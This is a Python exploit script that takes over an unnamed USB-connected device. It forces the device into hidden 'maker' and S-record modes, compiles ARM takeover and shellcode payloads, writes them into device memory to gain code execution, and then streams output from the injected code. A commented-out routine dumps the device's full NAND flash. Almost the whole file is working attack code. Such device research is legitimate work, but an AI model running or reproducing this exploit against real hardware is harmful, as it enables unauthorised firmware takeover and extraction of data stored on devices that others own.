import argparse
import usb.core
import usb.util
import time
import os.path
import tempfile
import subprocess
import struct
import tqdm
import sys

PAYLOAD_PATH = os.path.dirname(os.path.realpath(__file__))
LINKER = """
ENTRY(start)

SECTIONS
{
  . = BASE;

  .text     : { *(.text.start) *(.text   .text.*   .gnu.linkonce.t.*) }
  .rodata   : { *(.rodata .rodata.* .gnu.linkonce.r.*) }
  .bss      : { *(.bss    .bss.*    .gnu.linkonce.b.*) *(COMMON) }
  .data     : { *(.data   .data.*   .gnu.linkonce.d.*) }
  /DISCARD/ : { *(.interp) *(.dynsym) *(.dynstr) *(.hash) *(.dynamic) *(.comment) }
}
"""

COMPILE = ["arm-none-eabi-gcc", "-c", "-Os", "-march=armv4", "-ffixed-r4", "-ffixed-r5", "-fno-builtin-printf", "-fno-strict-aliasing", "-fno-builtin-memcpy", "-fno-builtin-memset", "-fno-builtin", "-I", PAYLOAD_PATH]
LINK = ["arm-none-eabi-gcc", "-nodefaultlibs", "-nostdlib"]
OBJCOPY = ["arm-none-eabi-objcopy", "-O", "binary"]


class PayloadBuilder:

    def __init__(self, srcfile):
        with open(os.path.join(PAYLOAD_PATH, srcfile)) as inf:
            self.src = inf.read()

    def build(self, **kwargs):
        base = kwargs["base"]
        src = self.src
        for arg, replacement in kwargs.items():
            src = src.replace("%{}%".format(arg), str(replacement))

        with tempfile.TemporaryDirectory() as tmp:
            p_linker_x = os.path.join(tmp, "linker.x")
            p_payload_c = os.path.join(tmp, "payload.c")
            p_payload_o = os.path.join(tmp, "payload.o")
            p_payload = os.path.join(tmp, "payload")
            p_payload_bin = os.path.join(tmp, "payload.bin")

            with open(p_linker_x, "w") as outf:
                outf.write(LINKER.replace("BASE", hex(base)))
            with open(p_payload_c, "w") as outf:
                outf.write(src)
            subprocess.check_output(COMPILE + ["-o", p_payload_o, p_payload_c])
            subprocess.check_output(LINK + ["-T", p_linker_x, "-o", p_payload, p_payload_o])
            subprocess.check_output(OBJCOPY + [p_payload, p_payload_bin])
            with open(p_payload_bin, "rb") as inf:
                payload = inf.read()
        return payload


def make_srec(dst, data):
    payload_sz = 1 + 4 + len(data)
    assert payload_sz < 0x100

    payload = bytearray(payload_sz)
    payload[0] = payload_sz
    payload[1:5] = struct.pack(">I", dst)
    payload[5:] = data

    assert len(payload) == payload_sz

    return "S3" + payload.hex() + bytes([~(sum(payload) & 0xFF) & 0xFF]).hex()


def make_s7(dst):
    payload_sz = 1 + 4
    assert payload_sz < 0x100

    payload = bytearray(payload_sz)
    payload[0] = payload_sz
    payload[1:5] = struct.pack(">I", dst)

    assert len(payload) == payload_sz

    # print(payload.hex())

    return "S7" + payload.hex() + bytes([~(sum(payload) & 0xFF) & 0xFF]).hex()


class Exploit:

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--vid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--pid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--addr', type=lambda x: int(x, 16), nargs='?', const=0xE0000000)
        parser.add_argument('--reboot', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--usb_reset', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--usb_getch', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--usb_send', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--usb_send_commit', type=lambda x: int(x, 16), required=True)

        args = parser.parse_args()

        self.args = args

    def nand_read_page(self, page):
        self.dev.write(3, struct.pack("<I", page))
        out = b""
        CHUNK = 16
        for x in range((2048 + 64) // CHUNK):
            data = b""
            while len(data) < CHUNK:
                data += bytearray(self.dev.read(0x82, 512))
            assert len(data) == CHUNK
            self.dev.write(3, b"\x42")
            out += data
        return out

    def run(self):
        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)
        if self.dev is None:
            raise RuntimeError("cannot find device with VID={:04X} PID={:04X}".format(self.args.vid, self.args.pid))

        print("Enter maker mode...")

        # validate support for mode =0xC0
        data = bytearray(self.dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0"))
        self.dev.read(0x81, 256)

        # set ep to mode 0xC0
        self.dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        self.dev.read(0x81, 256)

        # enter maker mode
        self.dev.write(3, bytes.fromhex("FF 56 55 42 00 03 C1 01 00 FE"))

        time.sleep(0.5)

        print("Enter srec mode...")
        self.dev.write(3, bytes.fromhex("FF 55 56 42 00 01 01 FE"))

        time.sleep(0.5)

        while True:
            self.dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
            if self.dev is not None:
                break

            if self.dev is None:
                print("Waiting for srec mode...")
                time.sleep(1)
            else:
                break

        self.dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0")
        self.dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        handshake = bytearray(self.dev.read(0x82, 4096))
        assert handshake == bytes.fromhex("4442800000000008")

        print("In srec mode")
        print("Manufacturer : {}".format(usb.util.get_string(self.dev, self.dev.iManufacturer)))
        print("Product      : {}".format(usb.util.get_string(self.dev, self.dev.iProduct)))

        print("Writing payload at 0x{:08X}".format(self.args.addr))
        payload = PayloadBuilder("g1_takeover.c").build(base=self.args.addr, reboot=self.args.reboot)
        # 4k to try bursting the cache
        payload += b"\x00" * (4 * 1024 - len(payload))

        for x in range(0, len(payload), 0x80):
            data = make_srec(self.args.addr + x, payload[x:x+0x80])
            assert self.dev.write(3, data) == len(data)

        self.dev.write(3, make_s7(self.args.addr))

        print("Waiting for the device to disconnect...")
        while True:
            dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
            if dev is None:
                break
            time.sleep(0.01)

        print("Waiting for the device to reconnect...")
        while True:
            dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
            if dev is not None:
                time.sleep(1)
                dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
                break
            time.sleep(0.01)
        self.dev = dev


        self.dev.ctrl_transfer(0x41, 0x62, 0x00, 0, b"\x02\xC0")
        self.dev.ctrl_transfer(0x41, 0x60, 0xC0, 0)
        self.dev.write(3, bytes.fromhex("FF 55 00 42 00 01 01 FE"))
        handshake = bytearray(self.dev.read(0x82, 4096))
        assert handshake == bytes.fromhex("4442800000000008")

        print("In srec mode")
        print("Manufacturer : {}".format(usb.util.get_string(self.dev, self.dev.iManufacturer)))
        print("Product      : {}".format(usb.util.get_string(self.dev, self.dev.iProduct)))

        print("Writing payload at 0x{:08X}".format(self.args.addr))
        shellcode = PayloadBuilder("g1_ap_code.c").build(base=0xe6c20000)
        payload = PayloadBuilder("g1_secondary.c").build(
            base=self.args.addr,
            shellcode=",".join(hex(x) for x in shellcode),
            usb_reset=self.args.usb_reset,
            usb_getch=self.args.usb_getch,
            usb_send=self.args.usb_send,
            usb_send_commit=self.args.usb_send_commit
        )
        # 4k to try bursting the cache
        payload += b"\x00" * (4 * 1024 - len(payload))

        for x in range(0, len(payload), 0x80):
            data = make_srec(self.args.addr + x, payload[x:x+0x80])
            assert self.dev.write(3, data) == len(data)

        self.dev.write(3, make_s7(self.args.addr))

        print("Waiting for the device to disconnect...")
        while True:
            dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
            if dev is None:
                break
            time.sleep(0.01)

        print("Waiting for the device to reconnect...")
        while True:
            dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
            if dev is not None:
                time.sleep(1)
                dev = usb.core.find(idVendor=0x04c5, idProduct=0x10ca)
                break
            time.sleep(0.01)
        self.dev = dev



        print("Handshake with payload")
        self.dev.write(3, b"\xBB")
        handshake = bytearray(self.dev.read(0x82, 4096))
        assert handshake == b"\xAA\xBB\xCC\xDD"

        print("success!")
        print("-" * 80)

        while True:
            try:
                data = bytearray(self.dev.read(0x82, 4096))
            except usb.core.USBTimeoutError:
                time.sleep(0.1)
                continue

            if b"\xCC" in data:
                break

            sys.stdout.buffer.write(data)
            sys.stdout.flush()

            self.dev.write(3, b"\xAA")

        # print("-" * 80)
        # print("Starting nand reader mode")
        # sys.stdout.flush()

        # num_pages = 512 * 1024 * 1024 // 2048

        # with open("nand.bin", "wb") as outf:
        #     with open("nand.oob", "wb") as outf_oob:
        #         with tqdm.tqdm(total=2048*num_pages, unit='B', unit_scale=True, unit_divisor=1024) as bar:
        #             for page in range(num_pages):
        #                 data = self.nand_read_page(page)
        #                 assert len(data) == 2048 + 64
        #                 outf.write(data)
        #                 # outf.write(data[0:2048])
        #                 # outf_oob.write(data[2048:])
        #                 bar.update(2048)

        #                 outf.flush()
        #                 outf_oob.flush()


def main():
    Exploit().run()


if __name__ == "__main__":
    main()
